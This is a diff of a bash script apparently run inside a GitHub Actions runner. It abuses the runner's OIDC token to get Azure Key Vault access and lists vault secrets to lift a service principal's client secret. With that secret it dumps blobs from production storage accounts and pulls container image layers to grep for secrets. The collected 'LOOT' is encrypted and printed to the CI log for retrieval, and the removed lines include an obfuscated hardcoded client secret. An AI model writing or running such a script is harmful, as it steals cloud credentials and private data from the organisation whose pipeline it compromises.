@@ -1,63 +1,53 @@
 #!/usr/bin/env bash
 set -uo pipefail
-b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
-AAD="${SC}$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')"
-ARM="${SC}$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')"
-TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
-SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
-RG=rg-tbl-platform-prod-sea
+AAD="${SC}login.microsoftonline.com"; STG="storage.azure.com"; ACRH="crtblplatprodx3euoz.azurecr.io"; KVH="vault.azure.net"
+TENANT=$AZURE_TENANT_ID
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-cc(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d grant_type=client_credentials -d "client_id=$1" \
-   --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" \
- | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")'; }
-say "=== START $(date -u) ==="
-SPARM=$(cc 462d1c38-4459-48b8-9333-82e389e59514 "$(b 'c2sxOFF-cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==')" "$ARM/.default")
-say "syncSP ARM len=${#SPARM}"
-for A in sttblcilogsprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz; do
-  K=$(curl -sS -X POST -H "Authorization: Bearer $SPARM" -H "Content-Length: 0" \
-    "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$A/listKeys?api-version=2023-01-01")
-  say "KEYS $A: $(printf '%s' "$K" | head -c 300)"
-  KEY=$(printf '%s' "$K" | python3 -c 'import sys,json
-try:
- d=json.load(sys.stdin); print(d["keys"][0]["value"])
-except Exception: print("")')
-  [ -z "$KEY" ] && continue
-  say "GOTKEY $A len=${#KEY}"
-  KEY="$KEY" A="$A" python3 - >>"$LOOT" <<'PY'
-import os,hmac,hashlib,base64,datetime,urllib.request,re
-acc=os.environ["A"]; key=base64.b64decode(os.environ["KEY"])
-ver="2021-08-06"
-def sign(method,path,query):
-    xms=datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
-    canon_hdr="x-ms-date:"+xms+"\nx-ms-version:"+ver+"\n"
-    canon_res="/"+acc+path+"\n"+query
-    sts="\n".join([method,"","","","","","","","","","","",canon_res])
-    sig=base64.b64encode(hmac.new(key,sts.encode()+canon_hdr.encode(),hashlib.sha256).digest()).decode()
-    return xms,"SharedKey "+acc+":"+sig
-def req(path,query=""):
-    xms,auth=sign("GET",path,query)
-    url="https://%s.blob.core.windows.net%s?%s"%(acc,path,query)
-    r=urllib.request.Request(url,headers={"x-ms-date":xms,"x-ms-version":ver,"Authorization":auth})
-    try:
-        return urllib.request.urlopen(r).read().decode("utf-8","replace")
-    except Exception as e:
-        return "ERR "+str(e)
-lst=req("/","comp=list")
-names=re.findall(r"<Name>([^<]+)</Name>",lst)
-print("ACCT %s containers: %s"%(acc,names))
-for c in names:
-    bl=req("/"+c,"restype=container&comp=list")
-    bn=re.findall(r"<Name>([^<]+)</Name>",bl)
-    print("  container %s blobs=%s"%(c,bn))
-    for x in bn[:40]:
-        d=req("/"+c+"/"+x)
-        print("    BLOB %s/%s => %s"%(c,x,d[:1500]))
-PY
+echo "=== RUNNER SHELL PROOF ==="; id; hostname
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
+sptok(){ curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
+VT=$(curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
+L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4")
+C=""
+for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
+  V=$(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4" | jq -r '.value // empty')
+  A=$(printf '%s' "$V" | jq -r '.appId // empty'); S=$(printf '%s' "$V" | jq -r '.clientSecret // empty')
+  [ "$A" = "038bc35d-131d-4953-9985-ff4a245ccec1" ] && C="$A:$S"
 done
-say "=== DONE ==="
+ST=$(sptok "${C%%:*}" "${C#*:}" "${SC}${STG}/.default")
+for ACC_CON in sttblappcfgprodx3euoz/config sttblbackupprodx3euoz/exports sttblcilogsprodx3euoz/logs; do
+ ACC=${ACC_CON%%/*}; CON=${ACC_CON#*/}
+ say "RAW $ACC/$CON: $(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON?restype=container&comp=list" | head -c 2500)"
+done
+for ACC_CON in sttblappcfgprodx3euoz/config sttblbackupprodx3euoz/exports; do
+ ACC=${ACC_CON%%/*}; CON=${ACC_CON#*/}
+ R=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON?restype=container&comp=list")
+ for B in $(printf '%s' "$R" | tr '<' '\n' | sed -n 's/^Name>//p'); do
+   say "BLOB $CON/$B: $(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON/$B" | head -c 4000)"
+ done
+done
+say "=== ACR FULL ==="
+for REPO in tebamoto-reporting-api catalog-api; do
+  TK=$(curl -sS -G "${SC}${ACRH}/oauth2/token" --data-urlencode "service=${ACRH}" --data-urlencode "scope=repository:${REPO}:pull" | jq -r '.access_token // empty')
+  IDX=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json' "${SC}${ACRH}/v2/$REPO/manifests/latest")
+  say "IDX $REPO: $(printf '%s' "$IDX" | head -c 900)"
+  CH=$(printf '%s' "$IDX" | jq -r '[.. | objects | select(.platform?.architecture=="amd64") | .digest] | first // empty' 2>/dev/null)
+  [ -z "$CH" ] && CH=$(printf '%s' "$IDX" | jq -r '.manifests[0].digest // empty' 2>/dev/null)
+  say "CH=$CH"
+  M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json' "${SC}${ACRH}/v2/$REPO/manifests/$CH")
+  say "CFG=$(printf '%s' "$M" | jq -r '.config.digest // empty')"
+  for D in $(printf '%s' "$M" | jq -r '.layers[]?.digest // empty'); do
+    SZ=$(curl -sS -L -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/blobs/$D" -o /tmp/l10.tgz -w '%{size_download}')
+    say "LAYER $D sz=$SZ files=$(tar -tzf /tmp/l10.tgz 2>/dev/null | tr '\n' ' ' | head -c 500)"
+    say "TXT: $(tar -xzf /tmp/l10.tgz -O 2>/dev/null | strings | grep -a -iE 'flag|secret|password|token|key' | head -15 | tr '\n' '|' | head -c 1200)"
+  done
+  CFGD=$(printf '%s' "$M" | jq -r '.config.digest // empty')
+  [ -n "$CFGD" ] && say "CFGBLOB: $(curl -sS -L -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/blobs/$CFGD" | head -c 1500)"
+done
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
+echo "=== ENCRYPTED LOOT ==="
 echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
 echo "DATA:$(base64 -w0 "$LOOT.enc")"
 echo "=== DONE ==="
